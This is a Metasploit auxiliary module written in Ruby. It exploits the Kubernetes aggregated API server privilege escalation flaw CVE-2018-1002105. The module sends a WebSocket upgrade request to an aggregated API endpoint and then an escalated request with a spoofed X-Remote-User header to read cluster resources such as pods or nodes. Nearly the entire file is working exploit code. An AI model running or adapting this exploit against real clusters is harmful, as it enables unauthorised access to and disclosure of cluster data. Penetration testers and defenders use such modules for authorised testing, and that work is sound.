##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/http'
require 'uri'
require 'json'

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kubernetes Aggregated API Server Privilege Escalation (unauthorised)',
      'Description'    => %q{
      	  An API call to any aggregated API server endpoint can be escalated 
	  to perform any API request against that aggregated API server, as 
	  long as that aggregated API server is directly accessible from the 
	  Kubernetes API server’s network. Default RBAC policy allows all 
	  users (authenticated and unauthenticated) to perform discovery API 
	  calls that allow this escalation against any aggregated API servers 
	  configured in the cluster.
      },
      'Author'         =>
        [
	  'Praveen Darshanam<praveend[dot]hac[at]gmail.com>', # metasploit module
	  'Ariel Zelivansky', # metrics api poc
	  'Vincent' # service catalog api poc
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-1002105' ],
          [ 'BID', '106068' ],
          [ 'URL', 'https://github.com/kubernetes/kubernetes/issues/71411' ],
          [ 'URL', 'https://blog.disects.com/2018/12/exploiting-kubernetes-privilege.html' ]
        ],
      'Targets'		=> 
        [
	  ['Kubernetes', {} ]
	],
      'Platform'       => ['linux', 'win'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'DefaultTarget'  => 0,
      'DisclosureDate'  => 'Nov 09 2018'))

    register_options(
      [
        Opt::RPORT(443),
	OptString.new('AGGREGATED_API', [ true, 'Aggregates API to use for Privilege Escalation', 'v1beta1.metrics.k8s.io' ]),
	OptString.new('API_SERVER', [ true, 'Kubernetes cluster API Server HOST/FQDN/IP Address', nil ]),
	OptString.new('API_RESOURCE_NAME', [ true, 'Kubernetes API Resource name (pods, nodes, servicebindings, seeds, shoots etc)', nil ]),
	OptString.new('NAMESPACE', [ false, 'Kubernetes namespace to get api-resource details from', nil ]),
        OptString.new('X-Remote-User', [ true, 'Kubernetes User to escalate', nil ]),
        OptString.new('X-Remote-Group', [ false, 'Kubernetes Group', nil ])
      ])
    deregister_options('RHOST')
  end

  def check
    host = datastore['API_SERVER']
    port = datastore['RPORT']
    api_ver = datastore['AGGREGATED_API'].split('.')[0]
    aggr_api = datastore['AGGREGATED_API'].split('.',2)[1]
    if port != 443
      req_str = "https://#{host}:#{port}/apis/#{aggr_api}/#{api_ver}"
    else
      req_str = "https://#{host}/apis/#{aggr_api}/#{api_ver}"
    end
    print_status("Checking the presence of Aggregated API\n#{datastore['AGGREGATED_API']}")
    Net::HTTP.start(host, port, :use_ssl => 'https', :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|
      check_uri = URI(req_str)
      ws_req = Net::HTTP::Get.new check_uri
      ws_req.add_field("User-Agent", "kubectl")
      ws_req.add_field("Upgrade", "WebSocket")
      ws_req.add_field("Connection", "upgrade")
      print_status("Sending WebSocket request to API Server\n#{req_str}")

      ws_resp = http.request ws_req 
      if ws_resp.code =~ /200/
        print_good("Found aggregated API Server \"#{datastore['AGGREGATED_API']}\" in the cluster")
        ws_data = JSON.parse(ws_resp.body)
        print_status("Response\n#{JSON.pretty_generate(ws_data)}") 
        http.finish
        return Exploit::CheckCode::Vulnerable
      else
        print_error("Aggregated API Server \"#{datastore['AGGREGATED_API']}\" not found")
        http.finish
        return Exploit::CheckCode::Safe
      end
    end
  end

  def privesc_request(host, port, aggr_api, api_ver)
    rsource = datastore['API_RESOURCE_NAME']
    if port != 443
      ws_req_str = "https://#{host}:#{port}/apis/#{aggr_api}/#{api_ver}"
      if datastore['NAMESPACE']
        pod_req_str = "https://#{host}:#{port}/apis/#{aggr_api}/#{api_ver}/namespaces/#{datastore['NAMESPACE']}/#{rsource}"
      else
        pod_req_str = "https://#{host}:#{port}/apis/#{aggr_api}/#{api_ver}/#{rsource}"
      end
    else
      ws_req_str = "https://#{host}/apis/#{aggr_api}/#{api_ver}"
      if datastore['NAMESPACE']
        pod_req_str = "https://#{host}/apis/#{aggr_api}/#{api_ver}/namespaces/#{datastore['NAMESPACE']}/#{rsource}"
      else
        pod_req_str = "https://#{host}/apis/#{aggr_api}/#{api_ver}/#{rsource}"
      end
    end

    Net::HTTP.start(host, port, :use_ssl => 'https', :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|
      uri = URI(ws_req_str)
      ws_req = Net::HTTP::Get.new uri
      ws_req.add_field("User-Agent", "kubectl")
      ws_req.add_field("Upgrade", "WebSocket")
      ws_req.add_field("Connection", "upgrade")
      print_status("Sending WebSocket request to API Server\n#{ws_req_str}")

      ws_resp = http.request ws_req 
      if ws_resp.code =~ /200/
        print_good("Found aggregated API Server \"#{datastore['AGGREGATED_API']}\" in the cluster")
        ws_data = JSON.parse(ws_resp.body)
        print_status(JSON.pretty_generate(ws_data)) 
      else
        print_error("Aggregated API Server \"#{datastore['AGGREGATED_API']}\" not found")
	http.finish
        return
      end
      uri = URI(pod_req_str)
      pod_req = Net::HTTP::Get.new uri
      pod_req.add_field("User-Agent", "kubectl")
      pod_req.add_field("X-Remote-User", datastore['X-Remote-User'])

      print_status("Sending escalated API request to kubernetes Resource\n#{pod_req_str}")
      pod_resp = http.request pod_req 

      if pod_resp.code =~ /200/
        print_good("Successfully escalated to user #{datastore['X-Remote-User']}")
        pod_data = JSON.parse(pod_resp.body)
        print_status(JSON.pretty_generate(pod_data)) 
      else
        print_error("Couldn't escalate to user #{datastore['X-Remote-User']}")
      end
      http.finish
    end
  end

  def run 
    host = datastore['API_SERVER']
    port = datastore['RPORT']
    api_ver = datastore['AGGREGATED_API'].split('.')[0]
    api = datastore['AGGREGATED_API'].split('.',2)[1]

    privesc_request(host, port, api, api_ver)
  end
end
